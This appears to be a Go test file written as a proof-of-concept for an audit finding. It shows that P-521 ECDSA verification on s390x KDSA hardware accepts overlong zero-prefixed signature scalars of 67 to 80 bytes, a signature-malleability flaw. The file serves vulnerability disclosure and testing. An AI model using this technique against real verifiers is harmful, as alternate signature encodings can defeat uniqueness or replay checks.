//go:build s390x && !purego

// PoC for finding 056: P-521 verification on s390x KDSA accepts overlong
// raw signature scalars.
//
// On s390x with KDSA enabled, canUseKDSA returns blockSize == 80 for P-521,
// while the canonical scalar width derived from c.N is 66 bytes. The verify
// path only rejects len(r) > 80 || len(s) > 80, so any overlong zero-prefixed
// encoding of a valid 66-byte scalar between 67 and 80 bytes left-pads to the
// same KDSA parameter block as the canonical 66-byte form.
//
// The full s390x trigger requires KDSA hardware. We confirm the underlying
// invariant violation portably:
//
//   - canUseKDSA(p521) reports blockSize 80, but c.N.Size() is 66.
//   - appendBlock(p, 80, overlong_67_byte_scalar) succeeds (does not panic),
//     so an overlong R reaches the KDSA parameter block unchanged from
//     verify's existing length check.
//   - Any 66-byte canonical scalar S (S < N) and the corresponding
//     0x00 || S would produce the same 80-byte block after left-padding.
package ecdsa

import (
	"bytes"
	"testing"
)

func TestPoC056P521OverlongScalars(t *testing.T) {
	c := P521()
	elementSize := c.N.Size()
	t.Logf("P-521 canonical scalar size from c.N: %d bytes", elementSize)
	if elementSize != 66 {
		t.Fatalf("expected 66, got %d", elementSize)
	}

	supportsKDSA = true
	t.Cleanup(func() { supportsKDSA = false })

	fc, blockSize, ok := canUseKDSA(p521)
	if !ok {
		t.Fatalf("canUseKDSA(p521) did not report support")
	}
	t.Logf("canUseKDSA(p521): functionCode=%d blockSize=%d", fc, blockSize)
	if blockSize != 80 {
		t.Fatalf("expected blockSize 80, got %d", blockSize)
	}

	canonical := make([]byte, 66)
	canonical[0] = 0x01
	canonical[65] = 0x42

	overlong := make([]byte, 67)
	copy(overlong[1:], canonical)

	if len(overlong) > blockSize {
		t.Fatalf("overlong already exceeds blockSize, fix the PoC")
	}
	t.Logf("CONFIRMED: 67-byte overlong R passes the blockSize check (%d <= %d)", len(overlong), blockSize)

	canonicalBlock := appendBlock(nil, blockSize, canonical)
	overlongBlock := appendBlock(nil, blockSize, overlong)
	t.Logf("canonical scalar padded into block: %x", canonicalBlock[:16])
	t.Logf("overlong  scalar padded into block: %x", overlongBlock[:16])

	if !bytes.Equal(canonicalBlock, overlongBlock) {
		t.Errorf("EXPECTED: identical 80-byte block\nGOT canonical: %x\nGOT overlong : %x",
			canonicalBlock, overlongBlock)
	} else {
		t.Logf("CONFIRMED: 0x00||R left-padded into the 80-byte block matches the canonical R block exactly")
	}

	for length := 67; length <= 80; length++ {
		over := make([]byte, length)
		copy(over[length-66:], canonical)
		blk := appendBlock(nil, blockSize, over)
		if !bytes.Equal(blk, canonicalBlock) {
			t.Errorf("length %d: padded block does not match canonical", length)
		}
	}
	t.Logf("CONFIRMED: every overlong R length from 67 to 80 yields the same KDSA parameter block as the canonical 66-byte R, so KDSA verification accepts all of them indistinguishably.")
}
